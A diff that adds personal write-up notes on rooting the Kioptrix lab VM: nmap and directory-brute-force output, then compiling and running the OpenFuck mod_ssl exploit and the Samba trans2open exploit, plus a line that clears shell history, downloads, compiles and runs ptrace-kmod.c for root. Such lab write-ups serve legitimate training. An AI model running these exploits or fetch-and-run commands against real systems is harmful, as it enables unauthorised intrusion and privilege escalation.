@@ -3,6 +3,305 @@ title: "Kioptrix"
 tags:
   - fetus
 ---
+
+## Exploitation Path:
+```
+version enumeration --> exploit finding --> exploitation
+```
+## nmap results:
+```sh title:"Dscan.txt"
+# Nmap 7.95 scan initiated Sun Aug 17 15:36:31 2025 as: /usr/lib/nmap/nmap -sCV -T4 -oN Dscan.txt 192.168.48.136
+Nmap scan report for 192.168.48.136
+Host is up (0.0019s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1          32768/tcp   status
+|_  100024  1          32768/udp   status
+139/tcp   open  netbios-ssn Samba smbd (workgroup: wMYGROUP)
+443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-09-26T09:32:06
+|_Not valid after:  2010-09-26T09:32:06
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_ssl-date: 2025-08-18T05:36:53+00:00; +10h00m03s from scanner time.
+32768/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:46:9F:01 (VMware)
+
+Host script results:
+|_clock-skew: 10h00m02s
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 17 15:36:50 2025 -- 1 IP address (1 host up) scanned in 18.85 seconds
+```
+## service enumeration 
+### [[SSH]] fix
+```sh
+ssh root@$ip -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -c aes128-cbc
+```
+- version enumeration didnt do anything
+### [[HTTP]] enumeration
+#### port 80:
+- default apache page
+- dirbusting results:
+```sh title:"fresults.txt" fold
+200      GET        8l       56w     1831c http://192.168.48.136/poweredby.png
+MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.48.136/manual/mod/ (Apache)
+MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.48.136/manual/ (Apache)
+MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.48.136/icons/ (Apache)
+200      GET        6l       51w     3487c http://192.168.48.136/icons/apache_pb.gif
+200      GET       86l      392w     2890c http://192.168.48.136/
+301      GET        9l       27w      307c http://192.168.48.136/manual/mod/mod_perl => http://127.0.0.1/manual/mod/mod_perl/
+301      GET        9l       27w      306c http://192.168.48.136/manual/mod/mod_ssl => http://127.0.0.1/manual/mod/mod_ssl/
+200      GET      662l     1815w    27700c http://192.168.48.136/manual/mod/mod_perl.html
+200      GET        3l       15w      462c http://192.168.48.136/icons/bomb.gif
+200      GET        2l       16w      349c http://192.168.48.136/icons/c.gif
+200      GET        2l       14w      297c http://192.168.48.136/icons/sound2.gif
+200      GET        1l       16w      384c http://192.168.48.136/icons/world2.gif
+200      GET        2l       14w      310c http://192.168.48.136/icons/forward.gif
+200      GET        2l       15w      364c http://192.168.48.136/icons/alert.red.gif
+200      GET        1l       13w      322c http://192.168.48.136/icons/transfer.gif
+200      GET        2l       14w      289c http://192.168.48.136/icons/continued.gif
+200      GET        2l       15w      354c http://192.168.48.136/icons/generic.sec.gif
+200      GET        3l       14w     1773c http://192.168.48.136/icons/compressed.gif
+200      GET        1l       14w      354c http://192.168.48.136/icons/binhex.gif
+200      GET        1l       15w      355c http://192.168.48.136/icons/comp.gray.gif
+200      GET        1l       12w      310c http://192.168.48.136/icons/hand.right.gif
+200      GET        1l       16w      351c http://192.168.48.136/icons/ps.gif
+200      GET        2l       17w      334c http://192.168.48.136/icons/text.gif
+200      GET        3l       18w      357c http://192.168.48.136/icons/broken.gif
+200      GET        1l       13w      264c http://192.168.48.136/icons/pie0.gif
+200      GET        1l       15w      362c http://192.168.48.136/icons/pdf.gif
+200      GET        2l       16w      458c http://192.168.48.136/icons/image2.gif
+200      GET        1l       17w      360c http://192.168.48.136/icons/link.gif
+200      GET        1l       17w      350c http://192.168.48.136/icons/movie.gif
+200      GET        1l       16w      368c http://192.168.48.136/icons/screw1.gif
+200      GET        1l       16w      371c http://192.168.48.136/icons/portal.gif
+200      GET        2l       14w      264c http://192.168.48.136/icons/pie6.gif
+200      GET        1l       13w      408c http://192.168.48.136/icons/sphere1.gif
+200      GET        2l       15w      408c http://192.168.48.136/icons/box2.gif
+200      GET        1l       13w      265c http://192.168.48.136/icons/pie7.gif
+200      GET        1l       14w      345c http://192.168.48.136/icons/alert.black.gif
+301      GET        9l       27w      299c http://192.168.48.136/icons/small => http://127.0.0.1/icons/small/
+200      GET        2l       14w      341c http://192.168.48.136/icons/folder.sec.gif
+200      GET        2l       13w      375c http://192.168.48.136/icons/box1.gif
+200      GET        1l       12w      188c http://192.168.48.136/icons/blank.gif
+200      GET        1l       14w      383c http://192.168.48.136/icons/sphere2.gif
+200      GET        1l       12w      221c http://192.168.48.136/icons/right.gif
+200      GET        1l       14w      271c http://192.168.48.136/icons/pie3.gif
+200      GET        1l       13w      318c http://192.168.48.136/icons/folder.gif
+200      GET        1l       13w      220c http://192.168.48.136/icons/up.gif
+200      GET        1l       15w      413c http://192.168.48.136/icons/image3.gif
+200      GET        2l       14w      265c http://192.168.48.136/icons/pie5.gif
+200      GET        2l       17w      357c http://192.168.48.136/icons/unknown.gif
+200      GET        1l       15w      306c http://192.168.48.136/icons/generic.red.gif
+200      GET        2l       14w      275c http://192.168.48.136/icons/ball.red.gif
+200      GET       16l       72w      898c http://192.168.48.136/manual/mod/
+200      GET       14l       56w      643c http://192.168.48.136/manual/
+200      GET        1l       15w      354c http://192.168.48.136/icons/burst.gif
+200      GET        2l       15w      314c http://192.168.48.136/icons/hand.up.gif
+200      GET        1l       13w      311c http://192.168.48.136/icons/tar.gif
+200      GET        2l       15w      365c http://192.168.48.136/icons/a.gif
+200      GET        1l       15w      358c http://192.168.48.136/icons/comp.blue.gif
+200      GET        1l       18w      346c http://192.168.48.136/icons/sound1.gif
+200      GET        1l       16w      340c http://192.168.48.136/icons/uu.gif
+200      GET        1l       14w      363c http://192.168.48.136/icons/patch.gif
+200      GET        1l       13w      383c http://192.168.48.136/icons/layout.gif
+200      GET        1l       13w      279c http://192.168.48.136/icons/pie1.gif
+200      GET        1l       14w      344c http://192.168.48.136/icons/p.gif
+200      GET        1l       14w      414c http://192.168.48.136/icons/quill.gif
+200      GET        1l       12w      223c http://192.168.48.136/icons/down.gif
+200      GET        1l       14w      286c http://192.168.48.136/icons/pie2.gif
+200      GET        1l       13w      326c http://192.168.48.136/icons/world1.gif
+200      GET        3l       16w      359c http://192.168.48.136/icons/tex.gif
+200      GET        2l       16w      351c http://192.168.48.136/icons/binary.gif
+200      GET        2l       16w      334c http://192.168.48.136/icons/f.gif
+200      GET        1l       13w      238c http://192.168.48.136/icons/pie8.gif
+200      GET        1l       13w      297c http://192.168.48.136/icons/back.gif
+200      GET        2l       16w      266c http://192.168.48.136/icons/pie4.gif
+200      GET        3l       15w      395c http://192.168.48.136/icons/index.gif
+200      GET        2l       16w      317c http://192.168.48.136/icons/generic.gif
+200      GET        1l       18w      354c http://192.168.48.136/icons/script.gif
+200      GET        1l       16w      340c http://192.168.48.136/icons/uuencoded.gif
+200      GET        3l       15w      368c http://192.168.48.136/icons/screw2.gif
+200      GET        1l       12w      224c http://192.168.48.136/icons/left.gif
+200      GET        1l       14w      338c http://192.168.48.136/icons/dvi.gif
+200      GET        1l       17w      312c http://192.168.48.136/icons/ball.gray.gif
+200      GET        1l       13w      318c http://192.168.48.136/icons/dir.gif
+200      GET        2l       15w      362c http://192.168.48.136/icons/folder.open.gif
+200      GET        1l       12w      399c http://192.168.48.136/icons/image1.gif
+200      GET       54l      292w    21800c http://192.168.48.136/icons/icon.sheet.gif
+200      GET       89l      656w     9472c http://192.168.48.136/icons/
+200      GET       86l      392w     2890c http://192.168.48.136/index.html
+301      GET        9l       27w      294c http://192.168.48.136/manual => http://127.0.0.1/manual/
+301      GET        9l       27w      292c http://192.168.48.136/mrtg => http://127.0.0.1/mrtg/
+301      GET        9l       27w      293c http://192.168.48.136/usage => http://127.0.0.1/usage/
+```
+- nothing interesting
+#### port 443:
+- broken 
+### mod_ssl manual exploitation
+#### version enumeration 
+- `mod_ssl/2.8.4` had an exploit called `openFuck`
+```sh
+searchsploit -m unix/remote/47080.c
+```
+- needs some dependencies to compile:
+```sh
+apt-get install libssl-dev
+gcc 47080.c -o exploit -lcrypto
+```
+- now to use the exploit we need the offset for the specific OS so it can do the buffer overflow. for redhat using `mod_ssl/2.8.4` its `0x6b`
+```sh
+./exploit 0x6b $ip -c 45
+```
+- we get a shell as `apache` if we run it. the automatic priv esc doesnt work cuz it fails to get the priv esc script. we'll get the file on our machine and then transfer it to kioptrix at `/tmp` so it can actually run when we get the connection again. the error is this that points to the script being missing: 
+```sh
+bash-2.05$ unset HISTFILE; cd /tmp; wget https://dl.packetstormsecur-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rd.c; ./exploit; 
+--02:57:36--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+
+Unable to establish SSL connection.
+
+Unable to establish SSL connection.
+gcc: ptrace-kmod.c: No such file or directory
+gcc: No input files
+rm: cannot remove `ptrace-kmod.c': No such file or directory
+bash: ./exploit: No such file or directory
+```
+- run this on the local machine to get the file, compile it and set up a python http server for the transfer:
+```sh
+wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+python -m http.server 1337
+```
+- and then run this on kioptrix to [[wget]] the file:
+```sh
+wget http://192.168.48.128:1337/ptrace-kmod.c
+```
+- rerun the exploit after quitting and boom the box is rooted :D <br>
+![[KioptrixRootedWithModSSLSS.png]]
+
+### [[SMB - SAMBA]] enumeration
+- smbmap didnt show anything
+- `smbclient -L \\\\$ip\\ -N`:
+```sh
+Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        IPC$            IPC       IPC Service (Samba Server)
+        ADMIN$          IPC       IPC Service (Samba Server)
+Reconnecting with SMB1 for workgroup listing.
+Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+        KIOPTRIX             Samba Server
+
+        Workgroup            Master
+        ---------            -------
+        MYGROUP              KIOPTRIX
+```
+- trying to access the shares doesnt work. needs a password
+#### version enumeration
+- nmap didnt have a version enum script 
+- got it thorugh metasploit 
+```sh
+msf6 auxiliary(scanner/smb/smb_version) > run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.48.136:139    -   Host could not be identified: Unix (Samba 2.2.1a)
+[*] 192.168.48.136        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+- the samba version is `2.2.1a` 
+- metasploit has a buffer overflow module for it. theres an RCE exploit too at `multiple/remote/10.c`
+### `10.c` manual exploitaion
+- mirrored and compiled it
+```sh
+searchsploit -m multiple/remote/10.c
+gcc 10.c -o 10
+```
+- `10.c` usage:
+```sh
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
+Usage: ./10 [-bBcCdfprsStv] [host]
+
+-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
+-B <step>       bruteforce steps (default = 300)
+-c <ip address> connectback ip address
+-C <max childs> max childs for scan/bruteforce mode (default = 40)
+-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
+-f              force
+-p <port>       port to attack (default = 139)
+-r <ret>        return address
+-s              scan mode (random)
+-S <network>    scan mode
+-t <type>       presets (0 for a list)
+-v              verbose mode
+```
+- `./10 -b 0 -v -p 139 $ip`:<br>
+![[KioptrixHasBeenRootedWith10cSS.png]]
+- boom rooted :DDD
+### [[metasploit_framework]] exploitation with trans2open
+- the module didnt work initially. had to change the payload from meterpreter to a non staged normy reverse tcp shell. rooted tho :D <br>
+![[KioptrixHasBeenRootedWithTrans2OpenSS.png]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# ==REDUNDANT==
 ## [[nmap]] results:
 
 ```zsh title:"nmap -sV -O" fold
